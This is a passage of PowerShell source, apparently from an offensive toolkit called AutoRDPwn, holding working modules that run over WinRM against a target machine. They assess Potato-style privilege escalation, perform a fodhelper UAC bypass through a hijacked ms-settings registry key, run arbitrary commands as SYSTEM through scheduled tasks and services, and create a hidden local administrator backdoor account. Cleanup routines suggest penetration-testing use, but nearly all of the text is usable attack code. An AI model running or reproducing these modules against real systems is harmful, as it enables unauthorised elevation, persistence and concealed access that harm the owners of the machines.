        if ($text.StartsWith('!')) { Write-ARWarn ('Token query failed: ' + $text.TrimStart('!')); continue }
        $parts = $text -split '\|'
        if ($parts.Count -lt 2) { continue }
        $held[[string]$parts[0]] = ([string]$parts[1] -eq '1')
    }
    Show-ARText ([pscustomobject]@{
            Identity        = [string]$result.Identity
            IsSystem        = [bool]$result.IsSystem
            IsAdministrator = [bool]$result.IsAdmin
            Build           = [string]$result.Build
            Caption         = [string]$result.Caption
            Version         = [string]$result.Version
        } | Format-List | Out-String)
    $impersonate = $false
    $assignPrimary = $false
    if ($held.ContainsKey('SeImpersonatePrivilege')) {
        $impersonate = [bool]$held['SeImpersonatePrivilege']
        Write-ARInfo ('SeImpersonatePrivilege: present, enabled=' + [string]$impersonate)
    }
    else { Write-ARWarn 'SeImpersonatePrivilege: not held by this token.' }
    if ($held.ContainsKey('SeAssignPrimaryTokenPrivilege')) {
        $assignPrimary = [bool]$held['SeAssignPrimaryTokenPrivilege']
        Write-ARInfo ('SeAssignPrimaryTokenPrivilege: present, enabled=' + [string]$assignPrimary)
    }
    else { Write-ARInfo 'SeAssignPrimaryTokenPrivilege: not held by this token.' }
    $build = [int]$result.Build
    if ([bool]$result.IsSystem) {
        Write-ARInfo 'The token is already SYSTEM: no impersonation step is needed.'
        Set-ARStatus 'Potato check: already SYSTEM' 'Ok'
        return
    }
    if ($impersonate) {
        $family = 'GodPotato / EfsPotato (RPC impersonation)'
        $reason = 'build ' + [string]$build + ' is inside the range where the JuicyPotato CLSIDs and the PrintSpoofer pipe are patched'
        if ($build -le 17763) {
            $family = 'JuicyPotato / RottenPotato (CLSID abuse)'
            $reason = 'build ' + [string]$build + ' still honours the CLSID argument that JuicyPotato needs'
        }
        elseif ($build -lt 20348) {
            $family = 'PrintSpoofer / SweetPotato (named pipe impersonation)'
            $reason = 'build ' + [string]$build + ' fixed the JuicyPotato CLSIDs, so the spooler named pipe is the road that still works'
        }
        Write-ARSuccess ('Applicable family: ' + $family + '.')
        Write-ARInfo ('Why: ' + $reason + '.')
        if ($assignPrimary) { Write-ARInfo 'SeAssignPrimaryToken is also held, so the CreateProcessAsUser variants of the same family apply without a second token dance.' }
        else { Write-ARInfo 'SeAssignPrimaryToken is missing, so stick to the CreateProcessWithToken path (no CreateProcessAsUser).' }
    }
    elseif ($assignPrimary) {
        Write-ARWarn 'Only SeAssignPrimaryTokenPrivilege is held: the create-process step is available but there is no impersonated token to hand it, so the Potato family does not apply on its own.'
    }
    else {
        Write-ARInfo 'Neither privilege is held: no Potato family applies, because the impersonated SYSTEM token cannot be obtained or used.'
    }
    Write-ARInfo 'Read-only: the current token and the OS build were queried, nothing was changed.'
    Set-ARStatus 'Potato check complete' 'Ok'
}

function Invoke-ARModuleUacBypass {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'UAC bypass (fodhelper)'
    $proofPath = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.txt')
    $defaultCommand = 'C:\Windows\System32\cmd.exe /c whoami /groups > "' + $proofPath + '" 2>&1'
    $command = Read-ARValue 'Command to run elevated through fodhelper' $defaultCommand
    $command = $command.Trim()
    if ([string]::IsNullOrWhiteSpace($command)) { throw 'The elevated command is empty.' }
    if ($command -match "[\r\n]") { throw 'The elevated command must be a single line.' }
    $execute = ((Read-ARValue 'Trigger fodhelper now? (y/n)' 'y') -match '^[Yy]')
    $session = Get-ARTargetSession
    # fodhelper.exe auto-elevates and then resolves the ms-settings URI through
    # the per-user Classes hive, so both values below are what the elevated
    # process reads. DelegateExecute must exist and be empty for the fallback.
    $keyPath = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
    # Phase one reads, phase two writes: the ledger has to hold the previous
    # state before anything on the target changes.
    $before = Invoke-ARRemote -Session $session -ArgumentList $keyPath -ScriptBlock {
        param($key)
        function Read-ARRegistryEntry {
            param([string]$Path, [string]$Name)
            $entry = [pscustomobject]@{ KeyPath = $Path; Name = $Name; Existed = $false; Value = $null; Kind = 'String' }
            $node = $null
            try { $node = Get-Item -LiteralPath $Path -ErrorAction Stop } catch { return $entry }
            $lookup = $Name
            if ($Name -eq '(default)') { $lookup = '' }
            if (@($node.GetValueNames()) -contains $lookup) {
                $entry.Existed = $true
                try { $entry.Value = [string]$node.GetValue($lookup, '') } catch { $entry.Value = '' }
                if ($lookup -ne '') { try { $entry.Kind = [string]$node.GetValueKind($lookup) } catch { } }
            }
            return $entry
        }
        $keyExisted = $false
        try { $keyExisted = Test-Path -LiteralPath $key } catch { $keyExisted = $false }
        return [pscustomobject]@{
            KeyExisted = [bool]$keyExisted
            Default    = (Read-ARRegistryEntry -Path $key -Name '(default)')
            Delegate   = (Read-ARRegistryEntry -Path $key -Name 'DelegateExecute')
        }
    }
    foreach ($entry in @($before.Default, $before.Delegate)) {
        if ($null -eq $entry) { continue }
        # Oldest snapshot wins: a second run must not record what it just wrote.
        $known = $false
        foreach ($existing in $script:ARRegistryBackup) {
            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
        }
        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
    }
    $result = Invoke-ARRemote -Session $session -ArgumentList $keyPath, $command -ScriptBlock {
        param($key, $commandLine)
        New-Item -Path $key -Force -ErrorAction Stop | Out-Null
        # Set-Item writes the default value of the key; New-ItemProperty cannot.
        Set-Item -Path $key -Value $commandLine -ErrorAction Stop
        New-ItemProperty -Path $key -Name 'DelegateExecute' -Value '' -PropertyType String -Force -ErrorAction Stop | Out-Null
        $node = Get-Item -LiteralPath $key -ErrorAction Stop
        return [pscustomobject]@{
            Command     = [string]$node.GetValue('', '')
            DelegateSet = [string]$node.GetValue('DelegateExecute', '')
        }
    }
    Write-ARSuccess ('Hijack written: ' + $keyPath)
    Write-ARInfo ('  (default) = ' + [string]$result.Command)
    Write-ARInfo ('  DelegateExecute = "' + [string]$result.DelegateSet + '" (present and empty)')
    $beforeText = 'absent'
    if ([bool]$before.Default.Existed) { $beforeText = '"' + [string]$before.Default.Value + '"' }
    $delegateText = 'absent'
    if ([bool]$before.Delegate.Existed) { $delegateText = 'present' }
    Write-ARInfo ('  previous (default): ' + $beforeText + '; previous DelegateExecute: ' + $delegateText)
    if ($command.Contains($proofPath) -and -not $script:ARModuleFiles.Contains($proofPath)) { $script:ARModuleFiles.Add($proofPath) }
    $triggerError = ''
    try {
        if ($execute) {
            $triggerError = [string](Invoke-ARRemote -Session $session -ScriptBlock {
                $binary = Join-Path $env:SystemRoot 'System32\fodhelper.exe'
                if (-not (Test-Path -LiteralPath $binary)) { return 'fodhelper.exe is missing from System32' }
                try { Start-Process -FilePath $binary -ErrorAction Stop; return '' }
                catch { return $_.Exception.Message }
            })
            if ($triggerError -ne '') { Write-ARWarn ('fodhelper could not be started: ' + $triggerError) }
            else { Write-ARInfo 'fodhelper.exe started; the command runs with the elevated token, in session 0 when this runs over WinRM.' }
        }
        else { Write-ARInfo 'Hijack left in place and not triggered; it is reverted before this action returns.' }
        if ($execute -and $command.Contains($proofPath)) {
            $proof = ''
            for ($attempt = 0; $attempt -lt 15; $attempt++) {
                Start-Sleep -Seconds 1
                $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
                    param($path)
                    if (-not (Test-Path -LiteralPath $path)) { return '' }
                    try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
                })
                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
            }
            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof file appeared: the elevated command did not run, or it wrote nowhere visible.' }
            else {
                Write-ARSuccess 'Elevated command produced this output:'
                $lines = @(($proof.Trim() -split "`r?`n") | Select-Object -First 40)
                Show-ARText ($lines -join "`n")
            }
        }
    }
    finally {
        # The default value of a registry key cannot be deleted by name, so the
        # session replay cannot undo it: this handler puts the key back itself.
        # The ledger entry stays as the second line of defence for DelegateExecute.
        try {
            Invoke-ARRemote -Session $session -ArgumentList $keyPath, [bool]$before.KeyExisted, [string]$before.Default.Value, [bool]$before.Default.Existed, [string]$before.Delegate.Value, [bool]$before.Delegate.Existed -ScriptBlock {
                param($key, $keyExisted, $defaultValue, $defaultExisted, $delegateValue, $delegateExisted)
                if (-not $keyExisted) {
                    Remove-Item -LiteralPath $key -Recurse -Force -ErrorAction SilentlyContinue
                    $parent = Split-Path -Parent $key
                    for ($step = 0; $step -lt 4; $step++) {
                        if ([string]::IsNullOrWhiteSpace($parent)) { break }
                        if (-not (Test-Path -LiteralPath $parent)) { $parent = Split-Path -Parent $parent; continue }
                        $node = Get-Item -LiteralPath $parent -ErrorAction SilentlyContinue
                        if ($null -eq $node) { break }
                        if (@($node.GetValueNames()).Count -gt 0) { break }
                        if (@($node.GetSubKeyNames()).Count -gt 0) { break }
                        Remove-Item -LiteralPath $parent -Recurse -Force -ErrorAction SilentlyContinue
                        $parent = Split-Path -Parent $parent
                    }
                    return
                }
                if ($defaultExisted) { Set-Item -Path $key -Value ([string]$defaultValue) -ErrorAction SilentlyContinue }
                else { Set-Item -Path $key -Value '' -ErrorAction SilentlyContinue }
                if ($delegateExisted) {
                    New-ItemProperty -Path $key -Name 'DelegateExecute' -Value ([string]$delegateValue) -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
                }
                else { Remove-ItemProperty -Path $key -Name 'DelegateExecute' -Force -ErrorAction SilentlyContinue }
            } | Out-Null
            Write-ARInfo 'Registry state restored: the hijacked key holds its previous values again.'
        }
        catch { Write-ARWarn ('Registry restore incomplete: ' + $_.Exception.Message) }
        if ($command.Contains($proofPath)) {
            try {
                Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
                    param($path)
                    Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
                } | Out-Null
            }
            catch { }
            [void]$script:ARModuleFiles.Remove($proofPath)
        }
    }
    Set-ARStatus 'UAC bypass (fodhelper) finished' 'Ok'
}

function Invoke-ARModuleSystemTask {
    param([switch]$Remove)
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SYSTEM scheduled task'
    $session = Get-ARTargetSession
    $operation = '1'
    if ($Remove) { $operation = '2' }
    elseif (-not $script:ARInvokedFromOption) { $operation = Read-ARValue 'Operation (1 create or update, 2 remove)' '1' }
    if ($operation -match '^2') {
        $ledger = New-Object System.Collections.Generic.List[string]
        if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) {
            foreach ($name in @($script:ARRemoteTasks.ToArray())) {
                if (([string]$name).StartsWith('AutoRDPwnSys')) { $ledger.Add([string]$name) }
            }
        }
        $removed = @(Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
            param($names)
            $deleted = New-Object System.Collections.Generic.List[string]
            foreach ($name in @($names)) {
                $existing = Get-ScheduledTask -TaskName ([string]$name) -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName ([string]$name) -Confirm:$false -ErrorAction SilentlyContinue
                if ($null -ne $existing) { $deleted.Add([string]$name) }
            }
            # Interrupted runs leave the prefix behind; the sweep uses the same one.
            foreach ($task in @(Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { [string]$_.TaskName -like 'AutoRDPwnSys*' })) {
                Unregister-ScheduledTask -TaskName ([string]$task.TaskName) -Confirm:$false -ErrorAction SilentlyContinue
                if (-not $deleted.Contains([string]$task.TaskName)) { $deleted.Add([string]$task.TaskName) }
            }
            return $deleted.ToArray()
        })
        foreach ($name in @($removed)) {
            if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARRemoteTasks.Remove([string]$name) }
            Write-ARSuccess ('Removed task: ' + [string]$name)
        }
        if (@($removed).Count -eq 0) { Write-ARInfo 'No AutoRDPwn SYSTEM task is registered on the target.' }
        Set-ARStatus 'SYSTEM task removal finished' 'Ok'
        return
    }
    $proofPath = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.txt')
    $defaultCommand = 'C:\Windows\System32\cmd.exe /c whoami /groups > "' + $proofPath + '" 2>&1'
    $command = Read-ARValue 'Command to run as SYSTEM' $defaultCommand
    $command = $command.Trim()
    if ([string]::IsNullOrWhiteSpace($command)) { throw 'The SYSTEM command is empty.' }
    if ($command -match "[\r\n]") { throw 'The SYSTEM command must be a single line.' }
    $executable = $command
    $arguments = ''
    if ($command.StartsWith('"')) {
        $closing = $command.IndexOf('"', 1)
        if ($closing -gt 1) {
            $executable = $command.Substring(1, $closing - 1)
            $arguments = $command.Substring($closing + 1).Trim()
        }
    }
    else {
        $space = $command.IndexOf(' ')
        if ($space -gt 0) {
            $executable = $command.Substring(0, $space)
            $arguments = $command.Substring($space + 1).Trim()
        }
    }
    if ([string]::IsNullOrWhiteSpace($executable)) { throw 'The SYSTEM command has no executable.' }
    $taskName = 'AutoRDPwnSys' + (New-ARModuleToken -Length 6)
    $result = Invoke-ARRemote -Session $session -ArgumentList $taskName, $executable, $arguments -ScriptBlock {
        param($name, $execute, $argumentText)
        # Register-ScheduledTask -Force makes a repeat run an update, not a duplicate.
        $action = New-ScheduledTaskAction -Execute $execute -Argument $argumentText
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Force -ErrorAction Stop | Out-Null
        $registered = Get-ScheduledTask -TaskName $name -ErrorAction Stop
        Start-ScheduledTask -TaskName $name -ErrorAction Stop
        $running = Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue
        return [pscustomobject]@{
            Name  = [string]$registered.TaskName
            State = [string]$running.State
            User  = [string]$registered.Principal.UserId
            Run   = [string]$registered.Principal.RunLevel
        }
    }
    if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) {
        if (-not $script:ARRemoteTasks.Contains($taskName)) { $script:ARRemoteTasks.Add($taskName) }
    }
    Write-ARSuccess ('Task registered: ' + $taskName + ' (user ' + [string]$result.User + ', run level ' + [string]$result.Run + ', state ' + [string]$result.State + ')')
    Write-ARInfo ('Command: ' + $command)
    if ($command.Contains($proofPath)) {
        if (-not $script:ARModuleFiles.Contains($proofPath)) { $script:ARModuleFiles.Add($proofPath) }
        $proof = ''
        for ($attempt = 0; $attempt -lt 20; $attempt++) {
            Start-Sleep -Seconds 1
            $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
                param($path)
                if (-not (Test-Path -LiteralPath $path)) { return '' }
                try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
            })
            if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
        }
        if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof file appeared: check the task history, the command may have failed inside session 0.' }
        else {
            Write-ARSuccess 'The task wrote this identity proof:'
            Show-ARText (@(($proof.Trim() -split "`r?`n") | Select-Object -First 40) -join "`n")
        }
        try {
            Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
        [void]$script:ARModuleFiles.Remove($proofPath)
    }
    Write-ARInfo ('The task stays registered until session cleanup or a removal run: ' + $taskName)
    Write-ARInfo 'Run once as SYSTEM and gone: this task is not a logon trigger, it has no schedule.'
    Set-ARStatus 'SYSTEM task registered' 'Ok'
}

function Invoke-ARModuleSystemService {
    param([switch]$Remove)
    # 01-core owns no service collection yet; the guarded declaration keeps this
    # handler self-contained and idempotent when it is dot-sourced twice.
    if ($null -eq (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue)) {
        $script:ARCreatedServices = New-Object System.Collections.Generic.List[string]
    }
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SYSTEM service'
    $session = Get-ARTargetSession
    $operation = '1'
    if ($Remove) { $operation = '2' }
    elseif (-not $script:ARInvokedFromOption) { $operation = Read-ARValue 'Operation (1 create and run, 2 remove)' '1' }
    if ($operation -match '^2') {
        $ledger = New-Object System.Collections.Generic.List[string]
        foreach ($name in @($script:ARCreatedServices.ToArray())) { $ledger.Add([string]$name) }
        $removed = @(Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
            param($names)
            $deleted = New-Object System.Collections.Generic.List[string]
            $all = New-Object System.Collections.Generic.List[string]
            foreach ($name in @($names)) { if (-not [string]::IsNullOrWhiteSpace([string]$name)) { $all.Add([string]$name) } }
            foreach ($service in @(Get-Service -Name 'AutoRDPwnSvc*' -ErrorAction SilentlyContinue)) { if (-not $all.Contains([string]$service.Name)) { $all.Add([string]$service.Name) } }
            foreach ($name in @($all.ToArray())) {
                $existed = ($null -ne (Get-Service -Name $name -ErrorAction SilentlyContinue))
                & sc.exe stop $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
                    if ([string](Get-Service -Name $name -ErrorAction SilentlyContinue).Status -eq 'Stopped') { break }
                    Start-Sleep -Milliseconds 250
                }
                & sc.exe delete $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
                    Start-Sleep -Milliseconds 250
                }
                $gone = ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue))
                if ($existed -and $gone) { $deleted.Add($name) }
            }
            return $deleted.ToArray()
        })
        foreach ($name in @($removed)) {
            [void]$script:ARCreatedServices.Remove([string]$name)
            Write-ARSuccess ('Removed service: ' + [string]$name)
        }
        if (@($removed).Count -eq 0) { Write-ARInfo 'No AutoRDPwn service is registered on the target.' }
        Set-ARStatus 'SYSTEM service removal finished' 'Ok'
        return
    }
    $proofPath = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.txt')
    $defaultCommand = 'C:\Windows\System32\cmd.exe /c whoami /priv > "' + $proofPath + '" 2>&1'
    $command = Read-ARValue 'Command to run as LocalSystem' $defaultCommand
    $command = $command.Trim()
    if ([string]::IsNullOrWhiteSpace($command)) { throw 'The LocalSystem command is empty.' }
    if ($command -match "[\r\n]") { throw 'The LocalSystem command must be a single line.' }
    $executable = $command
    $arguments = ''
    if ($command.StartsWith('"')) {
        $closing = $command.IndexOf('"', 1)
        if ($closing -gt 1) {
            $executable = $command.Substring(1, $closing - 1)
            $arguments = $command.Substring($closing + 1).Trim()
        }
    }
    else {
        $space = $command.IndexOf(' ')
        if ($space -gt 0) {
            $executable = $command.Substring(0, $space)
            $arguments = $command.Substring($space + 1).Trim()
        }
    }
    if ([string]::IsNullOrWhiteSpace($executable)) { throw 'The LocalSystem command has no executable.' }
    $serviceName = 'AutoRDPwnSvc' + (New-ARModuleToken -Length 6)
    $result = $null
    try {
        $result = Invoke-ARRemote -Session $session -ArgumentList $serviceName, $executable, $arguments -ScriptBlock {
            param($name, $execute, $argumentText)
            # Deterministic name per run: drop a stale copy so create stays a create.
            if ($null -ne (Get-Service -Name $name -ErrorAction SilentlyContinue)) {
                & sc.exe stop $name 2>&1 | Out-Null
                & sc.exe delete $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
                    Start-Sleep -Milliseconds 250
                }
            }
            $binPath = '"' + $execute + '"'
            if (-not [string]::IsNullOrWhiteSpace($argumentText)) { $binPath = $binPath + ' ' + $argumentText }
            # New-Service writes BinaryPathName verbatim and leaves the account at the
            # LocalSystem default; sc.exe create loses the embedded quotes that a
            # spaced path needs on the PowerShell to native argument round trip.
            New-Service -Name $name -BinaryPathName $binPath -DisplayName 'AutoRDPwn helper' -StartupType Manual -ErrorAction Stop | Out-Null
            $startOutput = [string](& sc.exe start $name 2>&1 | Out-String)
            $startCode = $LASTEXITCODE
            Start-Sleep -Seconds 2
            $service = Get-Service -Name $name -ErrorAction SilentlyContinue
            $state = 'missing'
            if ($null -ne $service) { $state = [string]$service.Status }
            return [pscustomobject]@{
                Name        = $name
                BinPath     = $binPath
                Created     = $true
                StartCode   = [int]$startCode
                StartOutput = $startOutput.Trim()
                State       = $state
            }
        }
        if (-not $script:ARCreatedServices.Contains($serviceName)) { $script:ARCreatedServices.Add($serviceName) }
        Write-ARSuccess ('Service created: ' + $serviceName + ' (LocalSystem, start= demand)')
        Write-ARInfo ('  binPath = ' + [string]$result.BinPath)
        if ([int]$result.StartCode -ne 0) {
            # 1053 is expected for a one-shot command: the process ran and exited.
            Write-ARInfo ('  sc start exit ' + [string]$result.StartCode + ': ' + [string]$result.StartOutput)
            Write-ARInfo '  A 1053 here means the command ran and exited before reporting back, which is normal for a one-shot payload.'
        }
        else { Write-ARInfo ('  service state now: ' + [string]$result.State) }
        if ($command.Contains($proofPath)) {
            if (-not $script:ARModuleFiles.Contains($proofPath)) { $script:ARModuleFiles.Add($proofPath) }
            $proof = ''
            for ($attempt = 0; $attempt -lt 20; $attempt++) {
                Start-Sleep -Seconds 1
                $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
                    param($path)
                    if (-not (Test-Path -LiteralPath $path)) { return '' }
                    try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
                })
                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
            }
            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof file appeared: the service command may have failed before writing anything.' }
            else {
                Write-ARSuccess 'The service ran this command as LocalSystem:'
                Show-ARText (@(($proof.Trim() -split "`r?`n") | Select-Object -First 40) -join "`n")
            }
        }
    }
    finally {
        # A LocalSystem service is never left behind: this handler deletes the
        # one it created even when the body above threw.
        try {
            Invoke-ARRemote -Session $session -ArgumentList $serviceName -ScriptBlock {
                param($name)
                & sc.exe stop $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
                    if ([string](Get-Service -Name $name -ErrorAction SilentlyContinue).Status -eq 'Stopped') { break }
                    Start-Sleep -Milliseconds 250
                }
                & sc.exe delete $name 2>&1 | Out-Null
                for ($spin = 0; $spin -lt 20; $spin++) {
                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
                    Start-Sleep -Milliseconds 250
                }
                return ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue))
            } | Out-Null
            Write-ARInfo ('Service removed: ' + $serviceName + ' (nothing is left registered)')
        }
        catch { Write-ARWarn ('Service removal incomplete: ' + $_.Exception.Message + ' — remove ' + $serviceName + ' manually with sc.exe delete.') }
        [void]$script:ARCreatedServices.Remove($serviceName)
        if ($command.Contains($proofPath)) {
            try {
                Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
                    param($path)
                    Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
                } | Out-Null
            }
            catch { }
            [void]$script:ARModuleFiles.Remove($proofPath)
        }
    }
    Set-ARStatus 'SYSTEM service run finished' 'Ok'
}

function Invoke-ARModuleBackdoorAccount {
    param([switch]$Remove)
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Local administrator account'
    $session = Get-ARTargetSession
    $hidePath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
    $operation = '1'
    if ($Remove) { $operation = '2' }
    elseif (-not $script:ARInvokedFromOption) { $operation = Read-ARValue 'Operation (1 create, 2 remove the accounts this session created)' '1' }
    if ($operation -match '^2') {
        $ledger = New-Object System.Collections.Generic.List[string]
        if (Get-Variable -Name ARCreatedAccounts -Scope Script -ErrorAction SilentlyContinue) {
            # 'AutoRDPwn' belongs to the PSexec handler and is not this action's to delete.
            foreach ($name in @($script:ARCreatedAccounts.ToArray())) {
                if ([string]$name -ne 'AutoRDPwn' -and -not [string]::IsNullOrWhiteSpace([string]$name)) { $ledger.Add([string]$name) }
            }
        }
        $removed = @(Invoke-ARRemote -Session $session -ArgumentList (, @($ledger.ToArray())) -ScriptBlock {
            param($names)
            $deleted = New-Object System.Collections.Generic.List[string]
            $hide = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
            foreach ($name in @($names)) {
                $existed = ($null -ne (Get-LocalUser -Name ([string]$name) -ErrorAction SilentlyContinue))
                & net.exe user ([string]$name) /delete 2>&1 | Out-Null
                $gone = ($null -eq (Get-LocalUser -Name ([string]$name) -ErrorAction SilentlyContinue))
                if ($existed -and $gone) { $deleted.Add([string]$name) }
                else {
                    try { Remove-ItemProperty -Path $hide -Name ([string]$name) -Force -ErrorAction SilentlyContinue } catch { }
                    continue
                }
                try { Remove-ItemProperty -Path $hide -Name ([string]$name) -Force -ErrorAction SilentlyContinue } catch { }
            }
            # The hide key is only ever created for these accounts; prune it when empty.
            $list = Get-Item -LiteralPath $hide -ErrorAction SilentlyContinue
            if ($null -ne $list) {
                $empty = ((@($list.GetValueNames()).Count -eq 0) -and (@($list.GetSubKeyNames()).Count -eq 0))
                if ($empty) {
                    Remove-Item -LiteralPath $hide -Recurse -Force -ErrorAction SilentlyContinue
                    $parent = Split-Path -Parent $hide
                    $node = Get-Item -LiteralPath $parent -ErrorAction SilentlyContinue
                    if ($null -ne $node) {
                        if ((@($node.GetValueNames()).Count -eq 0) -and (@($node.GetSubKeyNames()).Count -eq 0)) {
                            Remove-Item -LiteralPath $parent -Recurse -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
            return $deleted.ToArray()
        })
        foreach ($name in @($removed)) {
            if (Get-Variable -Name ARCreatedAccounts -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARCreatedAccounts.Remove([string]$name) }
            Write-ARSuccess ('Removed account: ' + [string]$name)
        }
        if (@($removed).Count -eq 0) { Write-ARInfo 'No account created by this tool is left on the target.' }
        Set-ARStatus 'Backdoor account removal finished' 'Ok'
        return
    }
    $generatedName = 'ardpwn' + (New-ARModuleToken -Length 6)
    $accountName = $generatedName
    if (-not $script:ARInvokedFromOption) { $accountName = Read-ARValue 'Account name' $generatedName }
    $accountName = $accountName.Trim()
    if ($accountName -notmatch '^[A-Za-z0-9._-]{1,20}$') { throw 'The account name must be 1-20 characters of letters, digits, dot, dash or underscore.' }
    $reserved = @('administrator', 'guest', 'defaultaccount', 'wdagutilityaccount', 'system', 'localservice', 'networkservice')
    if ($reserved -contains $accountName.ToLowerInvariant()) { throw ('The account name "' + $accountName + '" is reserved on Windows.') }
    $password = 'generate'
    if (-not $script:ARInvokedFromOption) { $password = Read-ARValue 'Password (the default generates one)' 'generate' }
    if ([string]::IsNullOrWhiteSpace($password) -or $password -eq 'generate') {
        # One character from each class first, then random fill: the policy check
        # cannot fail because of the generator.
        $upper = 'ABCDEFGHJKLMNPQRSTUVWXYZ'
        $lower = 'abcdefghijkmnopqrstuvwxyz'
        $digits = '23456789'
        $symbols = '!@#%*-_=+'
        $everything = $upper + $lower + $digits + $symbols
        $bytes = New-Object 'byte[]' 1
        $generator = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $builder = New-Object System.Text.StringBuilder
        try {
            foreach ($set in @($upper, $lower, $digits, $symbols)) {
                $generator.GetBytes($bytes)
                [void]$builder.Append($set[([int]$bytes[0] % $set.Length)])
            }
            while ($builder.Length -lt 20) {
                $generator.GetBytes($bytes)
                [void]$builder.Append($everything[([int]$bytes[0] % $everything.Length)])
            }
        }
        finally { $generator.Dispose() }
        $password = $builder.ToString()
    }
    # Recorded before the write: a transport failure after net user /add still
    # leaves the name where the session cleanup looks for it.
    if (Get-Variable -Name ARCreatedAccounts -Scope Script -ErrorAction SilentlyContinue) {
        if (-not $script:ARCreatedAccounts.Contains($accountName)) { $script:ARCreatedAccounts.Add($accountName) }
    }
    $result = Invoke-ARRemote -Session $session -ArgumentList $accountName, $password, $hidePath -ScriptBlock {
        param($userName, $plain, $hide)
        $addOutput = [string](& net.exe user $userName $plain /add 2>&1 | Out-String)
        $addCode = $LASTEXITCODE
        if ($addCode -ne 0) {
            return [pscustomobject]@{ Added = $false; Reason = $addOutput.Trim(); InAdmin = $false; AdminError = ''; Hidden = $false; HideError = ''; HideKeyExisted = $false; HideValueExisted = $false; HidePrior = 0 }
        }
        $inAdmin = $false
        $adminError = ''
        try {
            # SID first: 'Administrators' is localized, S-1-5-32-544 is not.
            $group = Get-LocalGroup -SID 'S-1-5-32-544' -ErrorAction Stop
            Add-LocalGroupMember -Group $group -Member $userName -ErrorAction Stop
            $inAdmin = $true
        }
        catch {
            $adminError = $_.Exception.Message
            # 'Administrators' is localized; resolve the SID first and hand net.exe
            # the localized name it expects.
            $groupName = 'Administrators'
            try { $groupName = (New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value } catch { }
            & net.exe localgroup $groupName $userName /add 2>&1 | Out-Null
            if ($LASTEXITCODE -eq 0) { $inAdmin = $true; $adminError = '' }
        }
        $hideKeyExisted = $false
        try { $hideKeyExisted = Test-Path -LiteralPath $hide } catch { $hideKeyExisted = $false }
        $hideValueExisted = $false
        $hidePrior = 0
        if ($hideKeyExisted) {
            $node = Get-Item -LiteralPath $hide -ErrorAction SilentlyContinue
            if ($null -ne $node) {
                if (@($node.GetValueNames()) -contains $userName) {
                    $hideValueExisted = $true
                    try { $hidePrior = [int]$node.GetValue($userName, 1) } catch { $hidePrior = 1 }
                }
            }
        }
        $hidden = $false
        $hideError = ''
        try {
            New-Item -Path $hide -Force -ErrorAction Stop | Out-Null
